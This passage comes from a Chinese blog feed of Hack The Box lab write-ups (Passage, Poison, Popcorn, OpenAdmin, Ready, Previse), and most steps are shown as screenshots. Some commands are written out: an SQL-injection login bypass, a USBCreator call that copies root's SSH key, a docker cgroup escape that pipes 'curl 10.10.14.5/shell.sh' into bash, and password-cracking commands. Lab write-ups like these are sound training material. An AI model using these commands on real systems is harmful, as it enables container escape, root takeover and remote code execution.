                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.5j5yv7g9kgo0.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.59wo1k4mo4k0.webp"
                     
                ></p>
<p>在paul用户目录下发现密钥文件，貌似还是nadav用户的，尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.3gi72smm44e0.webp"
                     
                ></p>
<p>在nadav用户家目录下发现viminfo</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.66ktj8kr2fk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.29rhzhoxy84k.webp"
                     
                ></p>
<p>USBCreator这个没见过，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.2q5oxxjx0hs0.webp"
                     
                ></p>
<p>有提权漏洞，搜一下exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.7d8ka9ex0b00.webp"
                     
                ></p>
<p>可以把root的密钥复制到其他目录，从而进行登录</p>
<p><code>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.6br444l35dc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.2mr7bwg4asc0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Poison - HackTheBox</title>
    <url>/post/062d13e9c08b/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.4esxo1c1iy60.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.4jbzp4b6zy80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.1twwfb7e2rr4.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.1cteh9n6g7j4.webp"
                     
                ></p>
<p>貌似是个文件包含</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.3hydrr0bn240.webp"
                     
                ></p>
<p>备份密码文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.23u85n1y1pz4.webp"
                     
                ></p>
<p>好家伙，编码13次</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.wkq0y8cmdf4.webp"
                     
                ></p>
<p>知道密码了，还差用户名，包含处看看能不能包含到passwd</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.3uezfy2fay40.webp"
                     
                ></p>
<p>应该就是charix的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.4jizddt3co80.webp"
                     
                ></p>
<p>提权</p>
<p>发现5901端口开了个vnc服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.6rnokhsi4240.webp"
                     
                ></p>
<p>先将端口映射一下</p>
<p><code>ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.6azu8c59wl40.webp"
                     
                ></p>
<p>然后在charix用户家目录下，有一个压缩包，解压密码为ssh登录密码，但他本身无权使用解压命令，所以将其复制到本地</p>
<p><code>scp charix@10.10.10.84:~/secret.zip .</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.1gr6uqbhhe3k.webp"
                     
                ></p>
<p>解压之后的文件便是vnc的连接密钥文件</p>
<p>直接用vnc连接即可，由于之前映射了端口到本地，所以连接IP为本地IP加上端口</p>
<p><code>vncviewer -passwd secret 127.0.0.1:5901</code></p>
<p>执行命令后，会打开一个vnc远程窗口，权限即为root权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.15wok1ucc83g.webp"
                     
                ></p>
<p>但是在这里操作很卡，可以选择反弹一个shell回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Poison/image.6gh29v46mvw0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Popcorn - HackTheBox</title>
    <url>/post/bc0993c0e01b/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.2376p1wd01q8.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.5n51blati840.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.s9n484fika8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.1blompt1sxeo.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.4m1yof7nkdm0.webp"
                     
                ></p>
<p>啥也没有，老样子，扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.5velf1n88dw0.webp"
                     
                ></p>
<p>第三个目录有东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.2jhjeq8dkku0.webp"
                     
                ></p>
<p>右边有个登录框，万能密码进去了<code>admin&#39; or &#39;1&#39;=&#39;1#</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.nxve8gbterk.webp"
                     
                ></p>
<p>有个上传功能点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.z1qfswkou9s.webp"
                     
                ></p>
<p>限制了，看看有没有法子绕过</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.lk3yhoxctsw.webp"
                     
                ></p>
<p>在Browse里面看到有一个文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.6nwl8gt3yss0.webp"
                     
                ></p>
<p>这有个修改功能</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.3ckb5q0ipws0.webp"
                     
                ></p>
<p>点进去也有上传点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.3tulot772ry0.webp"
                     
                ></p>
<p>还是不让上传，尝试绕过一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.3ry2kpc8yb40.webp"
                     
                ></p>
<p>先制作一个反弹shell的后门，修改为图片格式，在上传的时候抓包，在将后缀名修改回php</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.2c6u4zfqrosg.webp"
                     
                ></p>
<p>成功上传，访问文件，监听一下端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.5es15t6bj8c0.webp"
                     
                ></p>
<p>提权，跑一下检测脚本</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.2d7rehnkn2jo.webp"
                     
                ></p>
<p>脏牛提权，本地准备好poc，再让靶机下载进行编译运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.6l9yrvr6tlk0.webp"
                     
                ></p>
<p>连接脏牛创建的用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Popcorn/image.15isr4sfexeo.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenAdmin - HackTheBox</title>
    <url>/post/ba6552ba24b2/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.7fz4j7xh5lo0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.672u7qywk7k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.2da4h44ta7ok.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.3lxg84v5dtu0.webp"
                     
                ></p>
<p>看看80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.3fh69oh14wa0.webp"
                     
                ></p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.1a7kdk36zli8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.6x85l4o9poo0.webp"
                     
                ></p>
<p>看看登录功能点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.5d3dmg8rad80.webp"
                     
                ></p>
<p>默认是以guest用户登陆的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.548jvdli44c0.webp"
                     
                ></p>
<p>得到了opennetadmin应用名字和版本，搜一下可用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.2vdgoylywm80.webp"
                     
                ></p>
<p>有个rce</p>
<p>找下有无可利用脚本</p>
<p><code>https://github.com/amriunix/ona-rce/blob/master/ona-rce.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.1bksq8dmtksg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.6fv7cl78k340.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.g4d33rt0yr4.webp"
                     
                ></p>
<p>在网站目录下发现数据库的配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.ckk263ap2nk.webp"
                     
                ></p>
<p>拿到数据库账号密码，但数据库中无可利用信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.6uhe8ya8ne80.webp"
                     
                ></p>
<p>这还有两个用户，尝试用数据库密码登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.v7sb3r9gh4g.webp"
                     
                ></p>
<p>jimmy用户可以登录上去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.6418yjk0nxk0.webp"
                     
                ></p>
<p>user.txt还在另一个用户目录下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.5ih959dake40.webp"
                     
                ></p>
<p>发现一个52846端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.41xkywunel.webp"
                     
                ></p>
<p>无法直接访问</p>
<p>在本地curl一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.3ibh7skvazo0.webp"
                     
                ></p>
<p>没啥信息，继续看网站目录下的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.1daqcihjuh8g.webp"
                     
                ></p>
<p>main.php会包含joanna的密钥文件，curl请求一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.3dgi9z9z4080.webp"
                     
                ></p>
<p>得到密钥，尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.3duhmi9rsrs0.webp"
                     
                ></p>
<p>爆破密钥</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.6j7tm1iey200.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.4jgbnxixsjs0.webp"
                     
                ></p>
<p>可以用nano打开priv文件进行提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.3ubfu0cth8s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.1vxkf0endrs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.39nci5md26y0.webp"
                     
                ></p>
<p>这样不方便，反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/OpenAdmin/image.7flqgcjzcmo0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Ready - HackTheBox</title>
    <url>/post/f413d8c7139d/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.6kd2ucxubew0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.2qqdbw8hb180.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.5vmgzsko4400.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.zvrknkbagy8.webp"
                     
                ></p>
<p>访问5080端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.1i4846qqwjc0.webp"
                     
                ></p>
<p>gitlab仓库，注册一个账号进去看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.7f81qnde1y00.webp"
                     
                ></p>
<p>发现了gitlab的版本，搜一下有无exp</p>
<p><code>https://github.com/Algafix/gitlab-RCE-11.4.7</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.719s7cvl85o0.webp"
                     
                ></p>
<p>有个rce，尝试利用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.4dbnzdngtko0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.6jod4euwlx00.webp"
                     
                ></p>
<p>提权</p>
<p>在&#x2F;opt&#x2F;backup&#x2F;gitlab.rb文件中发现密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.34utww4ahl8.webp"
                     
                ></p>
<p>尝试切换可登陆的用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.nhiz2zf0xds.webp"
                     
                ></p>
<p>最终root用户成功登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.vygx8klbmlc.webp"
                     
                ></p>
<p>但在root目录下没有flag文件，而且没有计划任务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.gy3l4mcxmcg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.4mfgawiyi040.webp"
                     
                ></p>
<p>貌似是在docker容器内</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.37t6go8oarq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.5zchc49ccfo0.webp"
                     
                ></p>
<p>看下docker是否为特权启动</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.6fb48a51srw0.webp"
                     
                ></p>
<p>权限为特权</p>
<p>docker逃逸，依次执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`</span><br><span class="line">mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release</span><br><span class="line">t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span><br><span class="line">echo $t/c &gt;$d/release_agent;printf &#x27;#!/bin/sh\ncurl 10.10.14.5/shell.sh | bash&#x27; &gt;/c;</span><br><span class="line">chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;</span><br></pre></td></tr></table></figure>

<p>在本地新建一个反弹shell的sh文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.2kvur3tskig0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.k6s27gv0a5s.webp"
                     
                ></p>
<p>成功逃逸</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Ready/image.3j4tjdojzc00.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Previse - HackTheBox</title>
    <url>/post/f48ebf497173/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.1gtcu4xjvw1s.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.7ga1zuw58c80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.2nyfgelvz080.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4cc0sslzvii0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4xv897azik00.webp"
                     
                ></p>
<p>弱口令试试</p>
<p>​	<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.2w0p8rn8xkk0.webp"
                     
                ></p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.3gdk7h17mek.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4l7jd4t9pjc0.webp"
                     
                ></p>
<p>这里貌似可以注册账号</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4xzgoekt8zw0.webp"
                     
                ></p>
<p>但是还是会跳转到登录界面，burp抓包看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.25rjmmexajy8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.2cjmy772gmsk.webp"
                     
                ></p>
<p>注册一个账号</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.sax75avqafk.webp"
                     
                ></p>
<p>登录后台</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.5h2cj85rfhs0.webp"
                     
                ></p>
<p>貌似是个备份文件，下载下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.3oilikvev0y0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.11mhjt607jsg.webp"
                     
                ></p>
<p>发现数据库的配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.3evlz8d4p8o0.webp"
                     
                ></p>
<p>在logs.php中发现一个exec的执行函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4v7iswy6hsm0.webp"
                     
                ></p>
<p>应该是在这里，抓包看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.70r9sssutyg0.webp"
                     
                ></p>
<p>确实在这里，以POST传递的delim参数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.9l4sda9zcco.webp"
                     
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.77crmjtyw0o0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.2455ma0tdbwg.webp"
                     
                ></p>
<p>提权</p>
<p>利用config.php获得的mysql账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.3zvbkzm6fke0.webp"
                     
                ></p>
<p>发现m4lwhere和admin的哈希密码，但这哈希密码怎么这么奇怪，还带个特殊符号</p>
<p>在靶机上也发现有m4lwhere这个用户，尝试破解</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.5er1ppta65o0.webp"
                     
                ></p>
<p>这个哈希类型应该也是md5</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.21khs74hncp.webp"
                     
                ></p>
<p>用hashcat爆破下</p>
<p><code>hashcat -m 500 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4auy7csll080.webp"
                     
                ></p>
<p>hashcat有点慢，也可以用john</p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt -format=md5crypt-long hash</code></p>
<p><img  
